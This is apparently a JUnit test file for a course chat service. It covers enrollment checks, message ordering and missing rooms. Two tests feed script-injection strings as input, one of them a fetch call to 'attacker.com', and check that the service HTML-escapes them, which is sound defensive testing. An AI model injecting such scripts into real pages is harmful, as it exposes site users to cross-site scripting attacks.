package com.grupo.learningmore.services;

import com.grupo.learningmore.domain.chat.ChatMessage;
import com.grupo.learningmore.domain.chat.ChatRoom;
import com.grupo.learningmore.dto.Request.SendMessageRequest;
import com.grupo.learningmore.dto.Response.ChatMessageResponse;
import com.grupo.learningmore.exceptions.AccessDeniedException;
import com.grupo.learningmore.repositories.ChatMessageRepository;
import com.grupo.learningmore.repositories.ChatRoomRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;

import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.util.Date;
import java.util.List;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class ChatServiceTest {

    @Mock
    private ChatMessageRepository chatMessageRepository;

    @Mock
    private ChatRoomRepository chatRoomRepository;

    @Mock
    private EnrollmentService enrollmentService;

    @InjectMocks
    private ChatService chatService;

    private String chatRoomId;
    private String userId;

    @BeforeEach
    void setup() {
        chatRoomId = "CHR-a1b2c3d4e5f6789012345678901a2b3c";
        userId = "USR-b2c3d4e5f6789012345678901a2b3c4d";
    }

    @Test
    void shouldSendCourseQuestionSuccessfully() {

        SendMessageRequest request = new SendMessageRequest();

        request.setContent(
                "Professor, could you clarify the assignment deadline?"
        );

        ChatRoom room = new ChatRoom();

        ChatMessage savedMessage = new ChatMessage();

        savedMessage.setId("CHM-c3d4e5f6789012345678901a2b3c4d5e");

        savedMessage.setContent(
                "Professor, could you clarify the assignment deadline?"
        );

        savedMessage.setSentAt(new Date());

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenReturn(savedMessage);

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotNull(response);

        assertEquals(
                "Professor, could you clarify the assignment deadline?",
                response.getContent()
        );

        verify(chatMessageRepository, times(1))
                .save(any(ChatMessage.class));
    }

    @Test
    void shouldRejectUnauthorizedCourseAccess() {

        SendMessageRequest request = new SendMessageRequest();

        request.setContent(
                "Trying to access restricted course chat"
        );

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(false);

        assertThrows(
                AccessDeniedException.class,
                () -> chatService.sendMessage(
                        userId,
                        chatRoomId,
                        request
                )
        );

        verify(chatMessageRepository, never())
                .save(any(ChatMessage.class));
    }

    @Test
    void shouldSanitizeMaliciousScriptInjection() {

        SendMessageRequest request = new SendMessageRequest();

        request.setContent(
                "<script>fetch('http://attacker.com')</script>"
        );

        ChatRoom room = new ChatRoom();

        ChatMessage savedMessage = new ChatMessage();

        savedMessage.setId("CHM-d4e5f6789012345678901a2b3c4d5e6f");

        savedMessage.setContent(
                "&lt;script&gt;fetch('http://attacker.com')" +
                        "&lt;/script&gt;"
        );

        savedMessage.setSentAt(new Date());

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenReturn(savedMessage);

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertEquals(
                "&lt;script&gt;fetch('http://attacker.com')" +
                        "&lt;/script&gt;",
                response.getContent()
        );
    }

    @Test
    void shouldReturnOrderedDiscussionMessages() {

        ChatMessage msg1 = new ChatMessage();

        msg1.setId("CHM-e5f6789012345678901a2b3c4d5e6f70");

        msg1.setContent(
                "Does anyone understand exercise 3?"
        );

        msg1.setSentAt(new Date());

        ChatMessage msg2 = new ChatMessage();

        msg2.setId("CHM-f6789012345678901a2b3c4d5e6f7081");

        msg2.setContent(
                "Yes, the professor explained it in class yesterday."
        );

        msg2.setSentAt(new Date());

        when(chatRoomRepository.existsById(chatRoomId))
                .thenReturn(true);

        when(chatMessageRepository
                .findByChatRoomIdOrderBySentAtAsc(chatRoomId))
                .thenReturn(List.of(msg1, msg2));

        List<ChatMessageResponse> responses =
                chatService.getMessages(chatRoomId);

        assertEquals(2, responses.size());

        assertEquals(
                "Does anyone understand exercise 3?",
                responses.get(0).getContent()
        );

        assertEquals(
                "Yes, the professor explained it in class yesterday.",
                responses.get(1).getContent()
        );
    }

    @Test
    void shouldThrowExceptionWhenChatRoomDoesNotExist() {

        when(chatRoomRepository.existsById(chatRoomId))
                .thenReturn(false);

        RuntimeException exception = assertThrows(
                RuntimeException.class,
                () -> chatService.getMessages(chatRoomId)
        );

        assertEquals(
                "Chat room not found",
                exception.getMessage()
        );
    }

    @Test
    void shouldPopulateChatMessageCorrectlyWhenSendingMessage() {

        SendMessageRequest request = new SendMessageRequest();
        request.setContent("Hello professor");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        chatService.sendMessage(userId, chatRoomId, request);

        verify(chatMessageRepository).save(argThat(msg ->
                msg.getContent().equals("Hello professor") &&
                        msg.getSentAt() != null &&
                        msg.getChatRoom() != null
        ));
    }

    @Test
    void shouldEnsureMessageIsSanitizedAndNotEqualToOriginal() {

        SendMessageRequest request = new SendMessageRequest();
        request.setContent("<script>alert('hack')</script>");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotEquals("<script>alert('hack')</script>", response.getContent());

        assertTrue(response.getContent().contains("&lt;"));
        assertTrue(response.getContent().contains("&gt;"));
    }


    @Test
    void shouldExecuteSendMessageMappingLogic() {

        SendMessageRequest request = new SendMessageRequest();
        request.setContent("Hello");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotNull(response.getContent());
        assertEquals("Hello", response.getContent());
    }

    @Test
    void shouldPreserveMessageFlowEndToEnd() {

        SendMessageRequest request = new SendMessageRequest();
        request.setContent("Message flow test");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertAll(
                () -> assertEquals("Message flow test", response.getContent()),
                () -> assertNotNull(response),
                () -> assertFalse(response.getContent().isBlank())
        );
    }

    @Test
    void shouldExecuteSendMessageLambdaCoverage() {

        SendMessageRequest request = new SendMessageRequest();
        request.setContent("lambda coverage test");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenAnswer(invocation -> {
                    return Optional.of(room);
                });

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotNull(response);
        assertEquals("lambda coverage test", response.getContent());
    }

    @Test
    void shouldThrowWhenChatRoomNotFound_realPath() {

        SendMessageRequest request = new SendMessageRequest();
        request.setContent("test");

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.empty());

        RuntimeException ex = assertThrows(
                RuntimeException.class,
                () -> chatService.sendMessage(userId, chatRoomId, request)
        );

        assertEquals("Chat room not found", ex.getMessage());
    }
}